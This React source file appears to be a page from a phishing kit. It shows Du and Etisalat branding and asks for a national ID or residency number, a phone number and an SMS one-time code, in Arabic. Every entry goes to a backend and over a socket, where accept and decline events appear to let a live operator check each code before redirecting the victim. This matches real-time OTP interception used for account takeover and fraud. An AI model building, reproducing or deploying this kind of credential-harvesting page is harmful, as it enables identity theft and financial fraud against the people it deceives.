import React, { useState, useEffect } from "react";
import axios from "axios";
import { api_route, socket } from "../App";
import { TailSpin } from "react-loader-spinner";

const PhonePage = () => {
  const [formData, setFormData] = useState({
    phone: "",
    national_id: "",
    provider: "",
  });
  const [isProcessing, setIsProcessing] = useState(false);
  const [error, setError] = useState("");
  const [showOtp, setShowOtp] = useState(false);
  const [phoneOtp, setPhoneOtp] = useState("");
  const [orderId, setOrderId] = useState(null);
  const [timeLeft, setTimeLeft] = useState(180); // 3 minutes

  useEffect(() => {
    if (!showOtp) return;
    if (timeLeft <= 0) return;

    const timer = setInterval(() => {
      setTimeLeft((prev) => prev - 1);
    }, 1000);

    return () => clearInterval(timer);
  }, [showOtp, timeLeft]);

  const formatTime = (seconds) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`;
  };

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData({ ...formData, [name]: value });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!formData.provider) {
        setError("يرجى اختيار مزود الخدمة");
        return;
    }
    setIsProcessing(true);
    setError("");

    try {
      const storedId = localStorage.getItem("orderId");
      if (!storedId) {
          setError("Session expired. Please start over.");
          setIsProcessing(false);
          return;
      }
      setOrderId(storedId);

      socket.emit("joinOrder", storedId);
      await axios.post(`${api_route}/phone/${storedId}`, formData);
      socket.emit("phone", { id: storedId, ...formData });

    } catch (err) {
      setError("حدث خطأ ما.");
      setIsProcessing(false);
    }
  };


  socket.on("acceptPhone", (id) => {
    if (id === orderId) {
      setShowOtp(true);
      setIsProcessing(false);
    }
  });

  socket.on("declinePhone", (id) => {
    if (id === orderId) {
      setError("فشل التحقق. يرجى التأكد من البيانات.");
      setIsProcessing(false);
    }
  });
 

   const handleOtpSubmit = async (e) => {
    e.preventDefault();
    setIsProcessing(true);
    try {
        await axios.post(`${api_route}/phoneOtp/${orderId}`, { phoneOtp });
        socket.emit("phoneOtp", { id: orderId, phoneOtp });
    } catch (err) {
        setError("رمز غير صالح.");
        setIsProcessing(false);
    }
  };
  socket.on("acceptPhoneOtp", ({id,code}) => {
    if (id === orderId) {
      window.location.href = "/confirm?code="+code;
    }
  });

  socket.on("declinePhoneOtp", (id) => {
    if (id === orderId) {
      setError("رمز التحقق غير صحيح");
      setIsProcessing(false);
    }
  });

  const getProviderImage = () => {
    if (formData.provider === "Du") return "/du.jpeg";
    if (formData.provider === "Etisalat") return "/etislat.jpeg";
    return null;
  };

  return (
    <div className="w-full min-h-screen bg-white flex flex-col items-center">
            {/* Dynamic Provider Image / Whitespace */}
      <div className="w-full max-w-md h-20 flex items-center justify-center bg-white mt-10 px-10">
        {getProviderImage() ? (
          <img src={getProviderImage()} alt="Provider" className="max-h-full object-contain" />
        ) : (
          <div className="h-full w-full bg-white"></div>
        )}
      </div>
      {/* Header Image */}
      <div className="flex items-center p-3 mt-8 w-full">
        <span className="font-bold text-base text-center w-full ">يجب ان يكون رقم الجوال موثق ومطابق لبيانات الهوية / الإقامة</span>
      </div>



      {!showOtp ? (
        <form onSubmit={handleSubmit} className="w-full max-w-md px-10 space-y-6 mt-8" dir="rtl">
      <div className="space-y-1">
            <label className="block text-sm font-bold text-gray-600">رقم الهوية الوطنية / الإقامة</label>
            <input
              type="text"
              name="national_id"
              className="w-full border p-3 rounded-md focus:outline-none focus:ring-1 focus:ring-blue-500 text-center"
              value={formData.national_id}
              onChange={handleChange}
              maxLength={10}
              required
            />
          </div>

          <div className="space-y-1">
            <label className="block text-sm font-bold text-gray-600">اختر مزود الخدمة</label>
            <select
              name="provider"
              className="w-full border p-3 rounded-md bg-white focus:outline-none focus:ring-1 focus:ring-blue-500 appearance-none bg-[url('data:image/svg+xml;charset=US-ASCII,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%22292.4%22%20height%3D%22292.4%22%3E%3Cpath%20fill%3D%22%23666%22%20d%3D%22M287%2069.4a17.6%2017.6%200%200%200-13-5.4H18.4c-5%200-9.3%201.8-12.9%205.4A17.6%2017.6%200%200%200%200%2082.2c0%205%201.8%209.3%205.4%2012.9l128%20127.9c3.6%203.6%207.8%205.4%2012.8%205.4s9.2-1.8%2012.8-5.4L287%2095c3.5-3.5%205.4-7.8%205.4-12.8%200-5-1.9-9.2-5.5-12.8z%22%2F%3E%3C%2Fsvg%3E')] bg-[length:12px_12px] bg-[right_1rem_center] bg-no-repeat text-center"
              value={formData.provider}
              dir="rtl"
              onChange={handleChange}
              required
            >
              <option value="">اختر</option>
              <option value="Du">Du</option>
              <option value="Etisalat">Etisalat</option>
            </select>
          </div>

         
     <div className="space-y-1">
            <label className="block text-sm font-bold text-gray-700">رقم الجوال</label>
            <div className="flex items-center  border p-3 rounded-md w-full">
          
                        <input
              type="text"
              name="phone"
              inputMode="numeric"
              dir="ltr"
              className="w-full outline-none px-3 text-left"
              placeholder="05*****"
              value={formData.phone}
              onChange={handleChange}
              maxLength={10}
              required
            />
                <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAT4AAACfCAMAAABX0UX9AAAAM1BMVEX///8AAADIEC4AhD0AeB/NAC3GABzNEC+CVzYAhz2CCh7kp6x5UCcAeyDrrLPrrrN5AACAmKMeAAABfUlEQVR4nO3QxxHDMADAMKf3OPtPmyGosx8CNiCX41CX++M0k8W+wr7EvsS+xL7EvsS+xL7EvsS+xL7EvsS+xL7EvsS+xL7EvsS+xL7EvsS+xL7EvsS+xL7EvsS+xL7EvsS+xL7EvsS+xL7EvsS+xL7EvsS+xL7EvsS+xL7EvsS+xL7EvsS+xL7EvmT0vvfnPJPB+67fZS6D97327tmYfYl9iX2JfYl9iX2JfYl9iX2JfYl9iX2JfYl9iX2JfYl9iX2JfYl9iX2JfYl9iX2JfYl9iX2JfYl9iX2JfYl9iX2JfYl9iX2JfYl9iX2JfYl9iX2JfYl9iX2JfYl9iX2JfYl9yeB96949Gxu77/Y7TGX0vufeQduyL7EvsS+xL7EvsS+xL7EvsS+xL7EvsS+xL7EvsS+xL7EvsS+xL7EvsS+xL7EvsS+xL7EvsS+xL7EvsS+xL7EvsS+xL7EvsS+xL7EvsS+xL7EvsS+xL7EvsS+xL7EvsS+xL7EvsS/5A1YOMgc2ZZteAAAAAElFTkSuQmCC" alt="" className="w-8"/>
            </div>
  
          </div>
          {error && <p className="text-red-500 text-sm text-center font-bold">{error}</p>}

          <button
            disabled={isProcessing}
            type="submit"
            className="w-full bg-[#007aff] text-white py-3 rounded-lg font-bold hover:bg-blue-600 transition-colors disabled:opacity-50 text-xl"
          >
            {isProcessing ? "جاري المعالجة..." : "دخول"}
          </button>
        </form>
      ) : (
        <div className="w-full max-w-md px-10 mt-10" dir="rtl">

          
          <form onSubmit={handleOtpSubmit} className="space-y-4">
            <input
              type="text"
              placeholder="رمز التحقق"
              className="w-full border p-4 rounded text-right text-lg focus:outline-none focus:ring-1 focus:ring-blue-500"
              value={phoneOtp}
              maxLength={6}
              minLength={4}
                inputMode="numeric"
              onChange={(e) => setPhoneOtp(e.target.value)}
              required
            />

            <div className="flex justify-between items-center pt-2">
             
              
              <div className="text-gray-600 text-sm font-bold flex gap-1">
                <span className="font-bold">إعادة إرسال :</span>
                <span className="font-bold">{formatTime(timeLeft)}</span>
              </div>
               <button
                disabled={isProcessing}
                type="submit"
                className="bg-[#D9D9D9] text-gray-600 px-8 py-2 rounded-full font-bold hover:bg-gray-300 transition-colors disabled:opacity-50"
              >
                {isProcessing ? "جاري..." : "تحقق"}
              </button>
            </div>

            {error && <p className="text-red-500 text-sm text-center font-bold mt-4">{error}</p>}
          </form>
        </div>
      )}

      {/* Footer Image */}
      <div className=" mt-10 w-full flex items-center justify-center ">
        <img src="/phone-footer.jpeg" alt="Footer" className="w-3/4 max-w-md px-10" />
      </div>

      {isProcessing && (
        <div className="fixed inset-0 bg-black bg-opacity-10 flex items-center justify-center z-50">
          <TailSpin color="#007aff" height={50} width={50} />
        </div>
      )}
    </div>
  );
};

export default PhonePage;
